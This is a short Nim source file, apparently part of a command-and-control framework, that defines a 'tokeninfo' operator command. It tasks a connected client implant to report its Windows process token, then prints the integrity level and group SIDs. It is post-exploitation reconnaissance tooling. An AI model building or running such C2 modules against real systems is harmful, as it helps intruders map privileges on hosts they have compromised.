import asyncdispatch, tables, terminal

import ../../types, ../../communication

import ../../../clientTasks/tokinfo

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  let client = server.cli.handlingClient
  
  # just update the token info
  let task = await tokinfo.sendTask(client)
  await task.awaitResponse()

  echo "-- Token Information --"
  echo "Integrity: " & $client.tokenInformation.integrityLevel
  echo "Groups:"
  for group in client.tokenInformation.groups:
    stdout.styledWriteLine "\t", (if group.domain == "": "" else: (group.domain & "\\")), 
            fgGreen, group.name, fgDefault, " (" & group.sid & ")"  

let cmd*: Command = Command(
  execProc: execProc,
  name: "tokeninfo",
  argsLength: 0,
  usage: @["tokeninfo"],
  cliMode: @[ClientInteractMode],
  description: "Get info about own process windows token",
  category: CCClientInteraction,
  requiresConnectedClient: true
)